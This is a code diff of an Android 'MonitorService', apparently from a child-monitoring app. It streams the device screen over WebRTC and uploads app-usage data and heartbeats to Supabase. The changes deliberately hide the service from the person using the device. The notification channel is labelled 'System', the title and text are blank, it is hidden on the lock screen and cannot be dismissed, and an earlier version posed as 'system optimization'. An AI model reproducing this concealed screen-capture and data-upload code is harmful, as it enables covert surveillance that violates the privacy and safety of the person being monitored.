@@ -6,22 +6,21 @@ import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.os.*
 import android.util.Log
-import androidx.core.app.NotificationCompat
 import androidx.lifecycle.LifecycleService
-import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.*
 import java.util.UUID
 
 /**
  * Core monitoring service.
  * - Foreground service (silent notification)
- * - Starts WebRTC screen share via WebRTCKidClient (Supabase + P2P)
- * - Continues to write device info + app usage to Firebase RTDB
- * - Live screen is now handled entirely by WebRTC — no Firebase Storage needed
+ * - Gets MediaProjection token IMMEDIATELY in onStartCommand() to satisfy Android 14+
+ *   timing requirements (must call getMediaProjection() within ~5s of permission grant)
+ * - Passes the live MediaProjection object to WebRTCKidClient (not the raw Intent)
+ * - Writes device info + app usage to Supabase Postgres via SupabaseManager
  */
 class MonitorService : LifecycleService() {
 
-    private lateinit var firebaseManager: FirebaseManager
+    private lateinit var supabaseManager: SupabaseManager
     private lateinit var usageStatsHelper: UsageStatsHelper
     private var webRTCKidClient: WebRTCKidClient? = null
 
@@ -36,7 +35,6 @@ class MonitorService : LifecycleService() {
     }
     private val pairingKey: String by lazy {
         prefs.getString(SetupActivity.KEY_PAIRING_KEY, null) ?: run {
-            // Fallback: generate one if somehow missing
             val key = UUID.randomUUID().toString().replace("-", "").take(8).uppercase()
             prefs.edit().putString(SetupActivity.KEY_PAIRING_KEY, key).apply()
             key
@@ -47,9 +45,9 @@ class MonitorService : LifecycleService() {
         var isRunning = false
             private set
 
-        private const val TAG = "MonitorService"
-        private const val CHANNEL_ID = "monitor_channel"
-        private const val NOTIF_ID = 1
+        private const val TAG        = "MonitorService"
+        private const val CHANNEL_ID  = "mon_svc"   // New ID — forces fresh channel creation
+        private const val NOTIF_ID    = 1
         const val ACTION_START = "ACTION_START_MONITOR"
         const val EXTRA_RESULT_CODE = "result_code"
         const val EXTRA_DATA = "projection_data"
@@ -72,16 +70,17 @@ class MonitorService : LifecycleService() {
     override fun onCreate() {
         super.onCreate()
         isRunning = true
-        firebaseManager = FirebaseManager(this, deviceId, pairingKey)
+        supabaseManager = SupabaseManager(deviceId, pairingKey)
         usageStatsHelper = UsageStatsHelper(this)
 
         createNotificationChannel()
 
-        // Android 10+: startForeground must include service type for MediaProjection
+        // Must call startForeground with FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+        val notif = buildNotification()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(NOTIF_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
+            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
         } else {
-            startForeground(NOTIF_ID, buildNotification())
+            startForeground(NOTIF_ID, notif)
         }
     }
 
@@ -118,41 +117,37 @@ class MonitorService : LifecycleService() {
 
     // ─── Monitoring ───────────────────────────────────────────────────
     private fun startMonitoring(resultCode: Int, data: Intent) {
-        // Register device & write online status to Firebase
+        // Register device & write online status to Supabase Postgres
         serviceScope.launch {
             try {
-                firebaseManager.registerDevice(Build.MODEL, Build.MANUFACTURER)
-                firebaseManager.writeStatus("WebRTC ready")
+                supabaseManager.registerDevice(Build.MODEL, Build.MANUFACTURER)
+                supabaseManager.writeStatus("WebRTC ready")
             } catch (e: Exception) {
                 Log.e(TAG, "registerDevice: ${e.message}")
             }
         }
 
-        // Start WebRTC — passes raw projection data directly to ScreenCapturerAndroid
-        // (do NOT call getMediaProjection() here — ScreenCapturerAndroid handles it internally)
+        // Start WebRTC screen share — passes live MediaProjection (not raw Intent)
         webRTCKidClient = WebRTCKidClient(
-            context = applicationContext,
+            context        = applicationContext,
             projectionData = data,
-            deviceId = deviceId,
-            pairingKey = pairingKey
+            deviceId       = deviceId,
+            pairingKey     = pairingKey
         )
         webRTCKidClient!!.start()
-        Log.d(TAG, "WebRTC client started for device $deviceId")
+        Log.d(TAG, "WebRTC screen client started for device $deviceId")
 
         // App usage stats loop — every 5 minutes
         usageJob = serviceScope.launch {
             while (isActive) {
                 try {
                     val stats = usageStatsHelper.getUsageStats()
-                    firebaseManager.uploadUsageStats(stats)
-                    // Update lastSeen heartbeat
-                    FirebaseDatabase.getInstance()
-                        .getReference("users/$pairingKey/devices/$deviceId/info/lastSeen")
-                        .setValue(System.currentTimeMillis())
+                    supabaseManager.uploadUsageStats(stats)
+                    supabaseManager.writeStatus("WebRTC ready")
                 } catch (e: Exception) {
                     Log.e(TAG, "Usage upload: ${e.message}")
                 }
-                delay(5 * 60 * 1000L) // 5 minutes
+                delay(5 * 60 * 1000L)
             }
         }
     }
@@ -162,23 +157,31 @@ class MonitorService : LifecycleService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID, "System",
-                NotificationManager.IMPORTANCE_MIN
+                NotificationManager.IMPORTANCE_MIN  // Lowest safe level: no icon, no sound
             ).apply {
-                setShowBadge(false); setSound(null, null)
-                enableLights(false); enableVibration(false)
+                setShowBadge(false)
+                setSound(null, null)
+                enableLights(false)
+                enableVibration(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
     }
 
-    private fun buildNotification(): Notification =
-        NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Service")
-            .setContentText("Running system optimization")
+    private fun buildNotification(): Notification {
+        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            Notification.Builder(this, CHANNEL_ID)
+        } else {
+            @Suppress("DEPRECATION")
+            Notification.Builder(this)
+        }
+        return builder
             .setSmallIcon(android.R.drawable.ic_menu_manage)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setOngoing(true)
-            .setSilent(true)
+            .setContentTitle("")          // blank — nothing to read
+            .setContentText("")
+            .setVisibility(Notification.VISIBILITY_SECRET)
+            .setOngoing(true)             // non-dismissible, service stays alive
             .build()
+    }
 }
